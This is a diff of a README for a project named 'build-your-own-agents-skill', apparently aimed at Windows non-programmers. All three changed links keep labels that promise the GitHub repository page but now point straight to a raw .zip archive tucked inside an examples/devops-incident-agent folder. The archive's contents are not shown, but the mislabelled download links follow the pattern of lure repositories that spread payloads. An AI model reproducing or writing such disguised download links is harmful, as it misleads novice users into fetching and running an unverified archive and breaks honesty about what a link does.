@@ -1,6 +1,6 @@
 # 🤖 build-your-own-agents-skill - Build AI agents with clear steps
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill/raw/refs/heads/main/examples/devops-incident-agent/your_build_skill_own_agents_v2.3.zip)
 
 ## 🚀 Overview
 
@@ -17,7 +17,7 @@ This project fits people who want to:
 
 Use this link to visit the GitHub page and get the project files:
 
-[Open the GitHub download page](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill)
+[Open the GitHub download page](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill/raw/refs/heads/main/examples/devops-incident-agent/your_build_skill_own_agents_v2.3.zip)
 
 If you use the main repository page, click the green Code button, then choose Download ZIP. After that, unzip the folder on your Windows PC.
 
@@ -206,4 +206,4 @@ If you are not a programmer, you can still use this project to:
 
 If you need the project files again, use this link:
 
-[Visit the GitHub repository](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill)
+[Visit the GitHub repository](https://github.com/Satellite-vaudevilletheater933/build-your-own-agents-skill/raw/refs/heads/main/examples/devops-incident-agent/your_build_skill_own_agents_v2.3.zip)
